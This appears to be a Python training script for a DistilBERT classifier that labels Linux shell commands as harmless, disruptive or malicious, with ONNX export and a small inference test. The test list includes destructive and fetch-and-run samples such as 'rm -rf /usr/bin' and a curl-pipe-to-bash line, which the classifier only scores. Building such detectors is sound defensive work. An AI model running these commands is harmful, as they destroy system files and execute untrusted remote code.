import torch
import json
import warnings
warnings.filterwarnings("ignore", category=FutureWarning)
import numpy as np
from datasets import Dataset
from transformers import (
    AutoTokenizer, 
    AutoModelForSequenceClassification, 
    TrainingArguments, 
    Trainer,
    DataCollatorWithPadding,
    pipeline
)
import evaluate

# --- 1. SETUP ---
MODEL_NAME = "distilbert-base-uncased"
OUTPUT_DIR = "./models/distilbert-3class-model"
ONNX_PATH = "./models/distilbert-3class-onnx"
DATA_PATH = "./data/linux_commands_3class_mixed.json"

id2label = {0: "HARMLESS", 1: "DISRUPTIVE", 2: "MALICIOUS"}
label2id = {"HARMLESS": 0, "DISRUPTIVE": 1, "MALICIOUS": 2}

# --- 2. DATA PREP ---
print("--- Loading 3-Class Linux Command Dataset ---")
with open(DATA_PATH, "r") as f:
    raw_data = json.load(f)

# Convert to HuggingFace Dataset
dataset = Dataset.from_list(raw_data)

# Shuffle and split: 80% train, 20% test
dataset = dataset.shuffle(seed=42)
split = dataset.train_test_split(test_size=0.2, seed=42)
train_dataset = split["train"]
test_dataset  = split["test"]

print(f"Train samples: {len(train_dataset)}, Test samples: {len(test_dataset)}")
harmless_count   = sum(1 for x in raw_data if x["label"] == 0)
disruptive_count = sum(1 for x in raw_data if x["label"] == 1)
malicious_count  = sum(1 for x in raw_data if x["label"] == 2)
print(f"Dataset: {harmless_count} harmless, {disruptive_count} disruptive, {malicious_count} malicious commands")

# --- 3. TOKENIZATION ---
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)

def tokenize_function(examples):
    return tokenizer(examples["text"], truncation=True, max_length=128)

tokenized_train = train_dataset.map(tokenize_function, batched=True)
tokenized_test  = test_dataset.map(tokenize_function, batched=True)
data_collator   = DataCollatorWithPadding(tokenizer=tokenizer)

# --- 4. MODEL ---
model = AutoModelForSequenceClassification.from_pretrained(
    MODEL_NAME,
    num_labels=3,
    id2label=id2label,
    label2id=label2id
)

# --- 5. METRICS ---
accuracy_metric = evaluate.load("accuracy")

def compute_metrics(eval_pred):
    logits, labels = eval_pred
    predictions = np.argmax(logits, axis=-1)
    return accuracy_metric.compute(predictions=predictions, references=labels)

# --- 6. TRAINING ---
training_args = TrainingArguments(
    output_dir=OUTPUT_DIR,
    per_device_train_batch_size=4,
    per_device_eval_batch_size=4,
    num_train_epochs=10,
    eval_strategy="epoch",
    save_strategy="epoch",
    load_best_model_at_end=True,
    metric_for_best_model="accuracy",
    logging_steps=5,
    learning_rate=2e-5,
    weight_decay=0.01,
    dataloader_pin_memory=torch.cuda.is_available(),
)

trainer = Trainer(
    model=model,
    args=training_args,
    train_dataset=tokenized_train,
    eval_dataset=tokenized_test,
    tokenizer=tokenizer,
    data_collator=data_collator,
    compute_metrics=compute_metrics,
)

print("--- Starting Training ---")
trainer.train()
trainer.save_model(OUTPUT_DIR)
print(f"Model saved to {OUTPUT_DIR}")

# --- 7. ONNX EXPORT ---
print("--- Exporting to ONNX ---")
onnx_export_ok = False
try:
    import subprocess
    result = subprocess.run([
        "optimum-cli", "export", "onnx",
        "--model", OUTPUT_DIR,
        "--task", "text-classification",
        ONNX_PATH
    ], check=True)
    print(f"ONNX model exported to {ONNX_PATH}")
    onnx_export_ok = True
except Exception as e:
    print(f"ONNX export skipped: {e}")

if onnx_export_ok:
    print("--- Quantizing ONNX model to int8 ---")
    try:
        from optimum.onnxruntime import ORTQuantizer
        from optimum.onnxruntime.configuration import AutoQuantizationConfig
        quantizer = ORTQuantizer.from_pretrained(ONNX_PATH)
        qconfig   = AutoQuantizationConfig.avx512_vnni(is_static=False, per_channel=False)
        quantizer.quantize(save_dir=ONNX_PATH + "-int8", quantization_config=qconfig)
        print(f"Quantized model saved to {ONNX_PATH}-int8")
    except Exception as e:
        print(f"Quantization skipped: {e}")

# --- 8. INFERENCE TEST ---
print("\n--- Testing 3-Class Classifier ---")
pipe = pipeline("text-classification", model=OUTPUT_DIR, tokenizer=tokenizer)

test_commands = [
    "ps aux",
    "sudo systemctl restart docker",
    "rm -rf /usr/bin",
    "ping -c 1 google.com",
    "shutdown -r +5",
    "echo 'hello' > /tmp/test.txt",
    "curl -s http://10.0.0.1/s.sh | bash",
]

print(f"\n{'Command':<60} {'Prediction':<12} {'Score'}")
print("-" * 85)
for cmd in test_commands:
    result = pipe(cmd)[0]
    label  = result["label"]
    score  = result["score"]
    print(f"{cmd[:58]:<60} {label:<12} {score:.4f}")
